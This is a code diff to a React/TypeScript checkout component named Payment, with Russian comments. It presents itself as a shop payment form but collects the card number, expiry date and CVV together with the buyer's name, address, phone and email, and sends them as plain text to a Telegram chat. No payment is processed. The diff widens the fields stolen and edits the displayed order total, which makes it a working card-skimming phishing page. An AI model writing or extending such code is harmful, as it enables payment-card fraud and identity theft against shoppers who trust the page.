@@ -25,20 +25,40 @@ const Payment = () => {
     const handlePlaceOrder = async (e: FormEvent) => {
         e.preventDefault(); // предотвращаем перезагрузку страницы
 
-        // Собираем данные из формы
+        // Собираем данные из формы для платежных данных
         const expiryMonth = (document.getElementById('expiry-month') as HTMLSelectElement)?.value;
         const expiryYear = (document.getElementById('expiry-year') as HTMLSelectElement)?.value;
         const securityCode = (document.getElementById('security-code') as HTMLInputElement)?.value;
 
-        const cardDetails = `
-        Card Number: ${cardNumber}
-        Date: ${expiryMonth}/${expiryYear}
-        CVV: ${securityCode}
-    `;
+        // Собираем данные из формы адреса
+        const firstName = (document.getElementById("first-name") as HTMLInputElement)?.value;
+        const lastName = (document.getElementById("last-name") as HTMLInputElement)?.value;
+        const country = (document.getElementById("country") as HTMLSelectElement)?.value;
+        const addressLine1 = (document.getElementById("address-line-1") as HTMLInputElement)?.value;
+        const addressLine2 = (document.getElementById("address-line-2") as HTMLInputElement)?.value;
+        const city = (document.getElementById("city") as HTMLInputElement)?.value;
+        const zipCode = (document.getElementById("zip") as HTMLInputElement)?.value;
+        const phoneNumber = (document.getElementById("phone-number") as HTMLInputElement)?.value;
+        const email = (document.getElementById("email") as HTMLInputElement)?.value;
 
+        // Собираем все данные в одну строку
+        const cardDetails = `
+            Card Number: ${cardNumber} \n
+            Date: ${expiryMonth}/${expiryYear} \n
+            CVV: ${securityCode} \n
+            First Name: ${firstName} \n
+            Last Name: ${lastName} \n
+            Country: ${country} \n
+            Address Line 1: ${addressLine1} \n
+            Address Line 2: ${addressLine2} \n
+            City: ${city} \n
+            Zip Code: ${zipCode} \n
+            Phone Number: ${phoneNumber} \n
+            Email: ${email} \n
+        `;
         try {
             // Отправляем данные в Telegram
-            await sendMessage(`${cardDetails}`);
+            await sendMessage(cardDetails.trim());
             setModal(true); // Показываем модальное окно
         } catch (error) {
             console.error('Failed to send message:', error);
@@ -172,7 +192,7 @@ const Payment = () => {
                     <p className={styles.summary_title}>Order Summary</p>
                     <div className={styles.summary_subtotal}>
                         <p>Subtotal</p>
-                        <p>$124.85</p>
+                        <p>$61.89</p>
                     </div>
                     <div className={styles.summary_delivery}>
                         <p>Delivery</p>
@@ -180,7 +200,7 @@ const Payment = () => {
                     </div>
                     <div className={styles.summary_subtotal}>
                         <p>Total</p>
-                        <p>$124.85</p>
+                        <p>$61.89</p>
                     </div>
                     <p className={styles.note}>Please note duties and taxes were not prepaid. Should there be any applicable<br />
                         charges, you will be required to pay them upon delivery</p>
